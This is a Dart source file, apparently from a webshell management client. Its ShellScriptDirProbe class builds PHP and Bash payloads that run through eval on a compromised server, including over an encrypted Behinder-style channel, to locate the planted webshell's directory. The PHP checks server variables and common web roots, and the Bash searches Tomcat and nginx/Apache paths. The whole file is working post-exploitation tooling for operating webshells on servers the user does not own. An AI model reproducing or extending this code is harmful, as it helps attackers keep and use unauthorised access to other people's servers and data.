/// 在常见部署目录中探测 Webshell 脚本文件；未命中时由上层回落到 [getCurrentDir]。
class ShellScriptDirProbe {
  ShellScriptDirProbe._();

  /// 带调试追踪时，远端在 `[MX_SD]` 行后输出此标记，再接一行脚本目录（可为空）。
  static const kPhpScriptDirMarker = '<<<MATRIX_SCRIPT_DIR>>>';

  /// 设为 true 时下发带远端 `[MX_SD]` 的大段探测 PHP（明文 eval / 冰蝎均适用）。默认关闭。
  ///
  /// 不向控制台打印；需要时可读 [ShellConnector.lastShellScriptDirDiagnostic]。
  /// 冰蝎通道对大载荷易返回空体，平常应保持 false。
  static bool forcePhpScriptDirTrace = false;

  /// 解析 [phpResolveScriptDirCode] 的响应：`[traceLines]\n[kPhpScriptDirMarker]\n[path]` 或仅有 path。
  static ({String path, String remoteTrace}) parsePhpScriptDirResponse(
    String raw,
  ) {
    final s = raw.trim();
    final i = s.indexOf(kPhpScriptDirMarker);
    if (i < 0) return (path: s, remoteTrace: '');
    return (
      path: s.substring(i + kPhpScriptDirMarker.length).trim(),
      remoteTrace: s.substring(0, i).trim(),
    );
  }

  /// 根据远端原始响应生成诊断文本；路径不可用则 [path] 为 null。
  static ({String? path, String diagnostic}) diagnosePhpScriptDirProbeResponse({
    required String rawResponse,
    required String webshellUrl,
    required String connectorLabel,
    required bool traceEnabled,
    int? httpStatus,
    int? responseBodyBytes,
    String? retryNote,
  }) {
    final trimmed = rawResponse.trim();
    final base = safeBasenameFromUrl(webshellUrl);
    final rel = safeScriptRelDirFromUrl(webshellUrl);
    final parsed = parsePhpScriptDirResponse(trimmed);
    final usable = isUsableRemotePath(parsed.path);
    final buf = StringBuffer()
      ..writeln('connector=$connectorLabel')
      ..writeln('tracePhp=$traceEnabled')
      ..writeln('url=$webshellUrl')
      ..writeln('basename=${base ?? "(null)"}')
      ..writeln('relFromUrl=${rel ?? "(null)"}');
    if (retryNote != null) buf.writeln(retryNote);
    if (httpStatus != null) {
      buf.writeln('httpStatus=$httpStatus');
      buf.writeln('responseBodyBytes=${responseBodyBytes ?? "?"}');
    }
    if (parsed.remoteTrace.isNotEmpty) {
      buf.writeln('--- remote [MX_SD] ---');
      buf.writeln(parsed.remoteTrace);
    }
    buf
      ..writeln('--- parsed ---')
      ..writeln(
        'path=${parsed.path.isEmpty ? "(empty)" : parsed.path}',
      )
      ..writeln('usable=$usable');
    if (!usable &&
        httpStatus == 200 &&
        (responseBodyBytes == null || responseBodyBytes == 0)) {
      buf.writeln(
        'hint=HTTP 200 且响应体为空：多为服务端解密失败、explode("|") 无第二段或 eval 未输出；请核对连接密码、ECB/CBC，或与 ping 是否同源。',
      );
    }
    if (!usable) {
      buf.writeln('rawLength=${trimmed.length}');
      if (trimmed.length <= 800) {
        buf.writeln('raw=$trimmed');
      } else {
        buf.writeln('rawHead=${trimmed.substring(0, 800)}...');
      }
    }
    final diagnostic = buf.toString().trimRight();
    if (!usable) return (path: null, diagnostic: diagnostic);
    return (path: parsed.path, diagnostic: diagnostic);
  }

  /// 从 Webshell URL 取脚本文件名（去掉 `;jsessionid` 等后缀参数）。
  static String? safeBasenameFromUrl(String url) {
    try {
      final u = Uri.parse(url);
      final parts = u.pathSegments.where((s) => s.isNotEmpty).toList();
      if (parts.isEmpty) return null;
      var seg = parts.last;
      final semi = seg.indexOf(';');
      if (semi > 0) seg = seg.substring(0, semi);
      if (seg.isEmpty) return null;
      if (!RegExp(r'^[A-Za-z0-9._-]+$').hasMatch(seg)) return null;
      return seg;
    } catch (_) {
      return null;
    }
  }

  static bool isUsableRemotePath(String r) =>
      r.isNotEmpty && !r.startsWith('[');

  /// URL 中脚本前的相对路径，如 `/001/upload/shell.php` → `001/upload`。
  static String? safeScriptRelDirFromUrl(String url) {
    try {
      final parts =
          Uri.parse(url).pathSegments.where((s) => s.isNotEmpty).toList();
      if (parts.length < 2) return null;
      parts.removeLast();
      for (final p in parts) {
        var seg = p;
        final semi = seg.indexOf(';');
        if (semi > 0) seg = seg.substring(0, semi);
        if (seg.isEmpty || !RegExp(r'^[A-Za-z0-9._-]+$').hasMatch(seg)) {
          return null;
        }
      }
      return parts.join('/');
    } catch (_) {
      return null;
    }
  }

  /// PHP：先 `SCRIPT_FILENAME` / `__FILE__`（需能定位到脚本文件），再
  /// `DOCUMENT_ROOT`+`SCRIPT_NAME` / URL 子路径，最后在常见 Web 根目录中查找。
  /// 目录校验通过后优先输出 `realpath`；若 `realpath` 不可用仍输出原始路径（避免回落到进程 `getcwd()`）。
  ///
  /// [trace] 为 true 时，先输出多行 `[MX_SD] ...`，再输出 [kPhpScriptDirMarker] 与路径（可为空）。
  static String phpResolveScriptDirCode(
    String? basename, {
    String? shellUrl,
    bool trace = false,
  }) {
    final relFromUrl =
        shellUrl != null ? safeScriptRelDirFromUrl(shellUrl) : null;

    final buf = StringBuffer();
    if (basename != null && basename.isNotEmpty) {
      final n = basename.replaceAll("'", r"\'");
      buf.write("\$n='$n';");
      // probe 在冰蝎 class C::__invoke 的 eval 内执行：$n 处于方法局部作用域。
      // 普通函数内 `global $n` 指向 PHP 全局作用域，拿不到局部的 $n（永远 null）
      // → is_file 检查被跳过 → 任何目录都通过 → dirname(相对 SCRIPT_FILENAME) = "."
      // → realpath(".") = CWD（PHP-FPM 下常为 /）→ 输出根目录。
      // 解决方案：通过 $GLOBALS 传递 basename，$GLOBALS 是真正跨作用域的超全局变量。
      buf.write(r"$GLOBALS['_mx_n']=$n;");
      buf.write(
        r'function _mx_ok_dir($d){'
        r'$_n=isset($GLOBALS["_mx_n"])?$GLOBALS["_mx_n"]:"";'
        r'if($d===false||$d==="")return false;'
        r'if($_n==="")return true;'
        r'return @is_file($d.DIRECTORY_SEPARATOR.$_n);'
        r'}',
      );
    } else {
      buf.write(r'$n="";function _mx_ok_dir($d){return $d!==false&&$d!=="";}');
    }

    final marker = kPhpScriptDirMarker;
    if (trace) {
      // PHP 单引号字符串中 \\n 不是换行；用双引号拼出真实换行再接到路径。
      buf.write(
        r'$GLOBALS["_mx_sd_trace"]=array();'
        r'function _mx_sd_t($m){$GLOBALS["_mx_sd_trace"][]=$m;}'
        r'function _mx_sd_finish($p){foreach($GLOBALS["_mx_sd_trace"] as $_x){echo "[MX_SD] ".$_x."\n";}echo "',
      );
      buf.write(marker);
      buf.write(r'\n".$p;exit;}');
    } else {
      buf.write(
        r'function _mx_sd_t($m){}'
        r'function _mx_sd_finish($p){echo $p;exit;}',
      );
    }

    // `realpath` 在 open_basedir、权限或某些挂载上会返回 false，但 `is_file` 仍可能成功；
    // 仅在 realpath 成功时使用规范化路径，否则回落到原始目录字符串。
    // 同时只接受绝对路径目录，避免相对路径 "." 经 realpath 展开为进程 CWD（如 /）。
    buf.write(
      r'function _mx_echo_script_dir($dir){'
      r'if($dir===false||$dir===""){_mx_sd_t("_mx_echo skip empty");return;}'
      r'if($dir==="."){_mx_sd_t("_mx_echo skip dot cwd");return;}'
      r'if(!_mx_ok_dir($dir)){_mx_sd_t("_mx_echo fail ok_dir: ".$dir);return;}'
      r'$r=@realpath($dir);'
      r'$out=($r!==false&&$r!=="")?$r:$dir;'
      r'_mx_sd_t("_mx_echo OK dir=".$dir." out=".$out);'
      r'_mx_sd_finish($out);'
      r'}',
    );

    // SCRIPT_FILENAME 在某些 CGI/FastCGI 配置下会是相对路径（无前导 /），
    // dirname 后得到 "."，realpath(".") 展开为 CWD（PHP-FPM 下常为 /）→ 输出根目录。
    // 因此只在路径以 / 或盘符开头时才使用。
    buf.write(
      r'$f=isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:"";'
      r'_mx_sd_t("SCRIPT_FILENAME=".$f);'
      r'if($f!==""&&($f[0]==="/"||(strlen($f)>2&&$f[1]===":"&&($f[2]==="/"||$f[2]==="\\")))){'
      r'_mx_sd_t("try dirname(SCRIPT_FILENAME)=".dirname($f));'
      r'_mx_echo_script_dir(dirname($f));'
      r'}else{_mx_sd_t("skip SCRIPT_FILENAME branch (empty or not absolute)");}'
      r'$f2=explode("(",__FILE__)[0];'
      r'_mx_sd_t("__FILE__ stripped=".$f2);'
      r'if($f2!==""&&($f2[0]==="/"||(strlen($f2)>2&&$f2[1]===":"&&($f2[2]==="/"||$f2[2]==="\\")))){'
      r'_mx_sd_t("try dirname(__FILE__)=".dirname($f2));'
      r'_mx_echo_script_dir(dirname($f2));'
      r'}else{_mx_sd_t("skip __FILE__ branch (empty or not absolute)");}',
    );

    buf.write(
      r'if(!empty($_SERVER["DOCUMENT_ROOT"])){'
      r'$_mx_dr=rtrim($_SERVER["DOCUMENT_ROOT"],"/\\");'
      r'_mx_sd_t("DOCUMENT_ROOT=".$_mx_dr);'
      r'$_mx_sn=isset($_SERVER["SCRIPT_NAME"])?$_SERVER["SCRIPT_NAME"]:"";'
      r'_mx_sd_t("SCRIPT_NAME=".$_mx_sn);'
      r'if($_mx_sn!==""){'
      r'$_mx_rel=dirname($_mx_sn);'
      r'if($_mx_rel!=="/"&&$_mx_rel!=="\\"&&$_mx_rel!=="."){'
      r'$_mx_cand=$_mx_dr.$_mx_rel;'
      r'_mx_sd_t("try DOCUMENT_ROOT+dirname(SCRIPT_NAME)=".$_mx_cand);'
      r'_mx_echo_script_dir($_mx_cand);'
      r'}else{_mx_sd_t("skip docroot+SCRIPT_NAME dirname trivial: ".$_mx_rel);}'
      r'}else{_mx_sd_t("SCRIPT_NAME empty");}'
      r'}else{_mx_sd_t("DOCUMENT_ROOT empty");}',
    );

    if (relFromUrl != null && relFromUrl.isNotEmpty) {
      final rel = relFromUrl.replaceAll("'", r"\'");
      buf.write(
        r'if(!empty($_SERVER["DOCUMENT_ROOT"])){'
        r'$_mx_dr=rtrim($_SERVER["DOCUMENT_ROOT"],"/\\");'
        r'$_mx_cand=$_mx_dr.'
        "'/$rel';"
        r'_mx_sd_t("try DOCUMENT_ROOT+URLrel=".$_mx_cand);'
        r'_mx_echo_script_dir($_mx_cand);'
        r'}',
      );
    }

    if (basename == null || basename.isEmpty) {
      buf.write('_mx_sd_t("no basename from URL");_mx_sd_finish(\'\');');
      return buf.toString();
    }
    buf.write(r'$c=array();');
    buf.write(
      r'if(!empty($_SERVER["DOCUMENT_ROOT"]))$c[]=$_SERVER["DOCUMENT_ROOT"];',
    );
    for (final d in _unixPhpCandidateDirs) {
      final q = d.replaceAll(r"'", r"\'");
      buf.write("\$c[]='$q';");
    }
    buf.write(r'$wd=@getcwd();if($wd){$c[]=$wd;_mx_sd_t("getcwd=".$wd);}');
    buf.write(
      r'_mx_sd_t("fallback scan dirs count=".count($c));'
      r'foreach($c as $_mx_d){'
      r'if(!is_string($_mx_d)||$_mx_d==="")continue;'
      r'$_mx_p=$_mx_d.DIRECTORY_SEPARATOR.$n;'
      r'if(@is_file($_mx_p)){'
      r'$_mx_r=@realpath($_mx_d);'
      r'$out=($_mx_r!==false&&$_mx_r!=="")?$_mx_r:$_mx_d;'
      r'_mx_sd_t("fallback hit $_mx_p -> ".$out);'
      r'_mx_sd_finish($out);'
      r'}}'
      r'_mx_sd_t("fallback exhausted");'
      "_mx_sd_finish('');",
    );
    return buf.toString();
  }

  static const _unixPhpCandidateDirs = [
    '/var/www/html',
    '/var/www',
    '/usr/share/nginx/html',
    '/home/www',
    '/www/wwwroot',
    '/www/web',
    '/data/www',
    '/htdocs',
  ];

  /// Bash：在候选目录（含 Tomcat `webapps`）中查找名为 [basename] 的脚本。
  ///
  /// 命中路径在 `webapps` 下时返回对应 webapp 根；否则返回脚本所在目录。
  static String bashFindScriptInCandidateDirs(String basename) {
    final q = basename.replaceAll(r"'", r"'\''");
    final dirs = <String>[
      r'${CATALINA_BASE}/webapps/ROOT',
      r'${CATALINA_HOME}/webapps/ROOT',
      '/usr/local/tomcat/webapps/ROOT',
      '/opt/tomcat/webapps/ROOT',
      '/var/lib/tomcat9/webapps/ROOT',
      '/var/lib/tomcat/webapps/ROOT',
      '/var/lib/tomcat8/webapps/ROOT',
      r'$(pwd)/webapps/ROOT',
      r'$(pwd)',
      '/var/www/html',
      '/var/www',
    ];
    final dirList = dirs.map((d) => "'${d.replaceAll("'", r"'\''")}'").join(' ');
    return "_mx_n='$q';"
        'for _mx_d in $dirList; do '
        r'[ -z "$_mx_d" ]&&continue;'
        r'[ -d "$_mx_d" ]||continue;'
        r'if [ -f "$_mx_d/$_mx_n" ]; then printf %s "$_mx_d"; exit 0; fi;'
        r'_mx_f=$(find "$_mx_d" -maxdepth 5 -iname "$_mx_n" -type f 2>/dev/null|head -n1);'
        r'[ -z "$_mx_f" ]&&continue;'
        r'case "$_mx_f" in */webapps/*)'
        r' _mx_tmp="${_mx_f#*/webapps/}";'
        r' _mx_app="${_mx_tmp%%/*}";'
        r' _mx_pre="${_mx_f%/webapps/*}";'
        r' printf %s "$_mx_pre/webapps/$_mx_app";'
        r' exit 0;;'
        r'*)'
        r' _mx_dd=$(dirname -- "$_mx_f");'
        r' printf %s "$_mx_dd";'
        r' exit 0;;'
        r'esac;'
        r'done';
  }
}
